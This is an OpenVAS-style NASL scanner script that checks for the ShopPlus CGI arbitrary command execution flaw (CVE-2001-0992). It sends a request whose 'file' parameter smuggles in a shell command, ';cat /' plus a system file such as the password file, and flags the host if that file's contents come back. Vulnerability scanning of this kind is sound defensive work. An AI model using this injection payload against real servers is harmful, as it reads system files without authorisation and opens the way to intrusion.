if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10774" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_cve_id( "CVE-2001-0992" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "ShopPlus Arbitrary Command Execution" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2001 SecuriTeam" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.securiteam.com/unixfocus/5PP021P5FK.html" );
	script_tag( name: "summary", value: "The ShopPlus CGI is installed. Some versions of this CGI suffer from a
  vulnerability that allows execution of arbitrary commands with the security privileges of the web server." );
	script_tag( name: "solution", value: "Upgrade to the latest version available by contacting the author of the program." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
func reverse_remove( in_string ){
	finished = 1;
	first = 1;
	_ret = "";
	for(count = strlen( in_string ) - 1;finished;){
		if(in_string[count] == NASLString( "." )){
			if( first ){
				first = 0;
			}
			else {
				finished = 0;
			}
		}
		if(finished){
			_ret = NASLString( in_string[count], _ret );
		}
		if( count > 0 ){
			count = count - 1;
		}
		else {
			finished = 0;
		}
	}
	return ( _ret );
}
port = http_get_port( default: 80 );
files = traversal_files( "linux" );
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/shopplus.cgi";
	if(http_is_cgi_installed_ka( item: url, port: port )){
		hostname = get_host_name();
		fixed_hostname = reverse_remove( in_string: hostname );
		for file in keys( files ) {
			url = dir + "/shopplus.cgi?dn=" + fixed_hostname + "&cartid=%CARTID%&file=;cat%20/" + files[file] + "|";
			if(http_vuln_check( port: port, url: url, pattern: file )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

